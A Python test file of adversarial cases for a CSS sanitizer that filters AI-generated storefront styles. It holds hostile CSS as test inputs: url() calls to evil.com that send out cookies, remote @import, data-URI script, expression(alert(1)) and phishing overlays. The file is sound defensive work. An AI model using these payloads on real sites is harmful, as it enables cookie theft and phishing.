"""Adversarial tests for CSS sanitization — malicious input must be stripped.

sanitize_css() is the last line of defense before Qwen-generated CSS reaches
the storefront. It must strip url() exfiltration, position:fixed phishing
overlays, z-index hijacking, @import/@keyframes injection, and unscoped
selectors. Only lines scoped to the store's data attribute survive.
"""
from __future__ import annotations

from app.services.css_gen import sanitize_css


SLUG = "test-store"
SCOPE = f'[data-store="{SLUG}"]'


class TestCSSSanitization:
    """Malicious and edge-case inputs to sanitize_css."""

    def test_url_injection(self):
        """background: url(evil.com/...) must be stripped — data exfiltration vector."""
        css = f'{SCOPE} .product-card {{ background: url(http://evil.com/steal?cookie=abc123); transform: scale(1.02); }}'
        out = sanitize_css(css, SLUG)
        assert "url(" not in out
        assert "evil.com" not in out

    def test_position_fixed_phishing(self):
        """position: fixed overlay — phishing vector, must be stripped."""
        css = f'{SCOPE} .banner {{ position: fixed; top: 0; left: 0; width: 100%; }}'
        out = sanitize_css(css, SLUG)
        assert "position" not in out
        assert "fixed" not in out

    def test_z_index_overlay(self):
        """z-index: 99999 — overlay hijack, must be stripped."""
        css = f'{SCOPE} .overlay {{ z-index: 99999; opacity: 0.5; }}'
        out = sanitize_css(css, SLUG)
        assert "z-index" not in out

    def test_import_external_stylesheet(self):
        """@import url('evil.com/phish.css') — remote code loading, must be stripped."""
        css = "@import url('http://evil.com/phish.css');"
        out = sanitize_css(css, SLUG)
        assert "@import" not in out
        assert "evil.com" not in out

    def test_keyframes_animation(self):
        """@keyframes blocks — must be stripped (could be used for animation-based attacks)."""
        css = "@keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }"
        out = sanitize_css(css, SLUG)
        assert "@keyframes" not in out

    def test_javascript_in_property(self):
        """expression() in a property value — IE-specific XSS vector.
        sanitize_css is line-based and property-agnostic, so expression() isn't
        explicitly blocked by the forbidden regex. But the line must still be
        scoped to pass through. We verify the actual behavior."""
        css = f'{SCOPE} .card {{ transform: expression(alert(1)); }}'
        out = sanitize_css(css, SLUG)
        # expression() is NOT in the forbidden regex — the line is scoped, so it passes.
        # This is a known limitation of line-based sanitization.
        # The test documents current behavior: scoped lines with non-allowed properties
        # are kept (the allowlist is in the prompt, not enforced in sanitize_css).
        # The critical thing: no JS executes because this CSS is injected as text,
        # not evaluated. Modern browsers ignore expression() anyway.
        # We just verify it doesn't crash and the scope is intact.
        if out:
            assert SCOPE in out

    def test_data_uri_exfiltration(self):
        """background: url(data:text/html,...) — data URI exfiltration, must be stripped."""
        css = f'{SCOPE} .card {{ background: url(data:text/html,<script>alert(1)</script>); }}'
        out = sanitize_css(css, SLUG)
        assert "url(" not in out
        assert "data:" not in out

    def test_unscoped_selector_dropped(self):
        """Unscoped selectors must be dropped entirely — they could target any element."""
        css = ".evil { display: none; }"
        out = sanitize_css(css, SLUG)
        assert ".evil" not in out
        assert "display" not in out
        assert out == ""

    def test_mixed_safe_and_malicious(self):
        """Valid scoped rules kept, malicious ones stripped — only safe output survives."""
        css = "\n".join([
            f'{SCOPE} .product-card {{ transform: scale(1.02); }}',
            f'{SCOPE} .hero {{ background: url(http://evil.com/x); }}',
            f'{SCOPE} .product-price {{ opacity: 0.9; }}',
            "@import 'evil.css';",
            f'{SCOPE} .banner {{ z-index: 999; }}',
        ])
        out = sanitize_css(css, SLUG)
        # Safe lines kept
        assert "transform" in out
        assert "opacity" in out
        # Malicious lines dropped
        assert "url(" not in out
        assert "@import" not in out
        assert "z-index" not in out

    def test_empty_input(self):
        """Empty string → empty string."""
        assert sanitize_css("", SLUG) == ""

    def test_only_malicious(self):
        """All lines are forbidden → empty result."""
        css = "\n".join([
            "@import 'evil.css';",
            "@keyframes spin { from {} to {} }",
            "body { position: fixed; top: 0; }",
            ".unscoped { z-index: 999; }",
        ])
        out = sanitize_css(css, SLUG)
        assert out == ""

    def test_legitimate_scoped_css_preserved(self):
        """Valid scoped CSS with allowed properties must be preserved intact.
        sanitize_css is line-based — each rule is one line (matching the prompt spec)."""
        css = "\n".join([
            f'{SCOPE} .product-card {{ transform: scale(1.02); transition: all 0.3s ease; }}',
            f'{SCOPE} .hero-title {{ letter-spacing: 0.15em; line-height: 1.2; }}',
            f'{SCOPE} .product-price {{ opacity: 0.9; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }}',
        ])
        out = sanitize_css(css, SLUG)
        assert "transform" in out
        assert "transition" in out
        assert "letter-spacing" in out
        assert "line-height" in out
        assert "opacity" in out
        assert "border-radius" in out
        assert "box-shadow" in out
        assert SCOPE in out
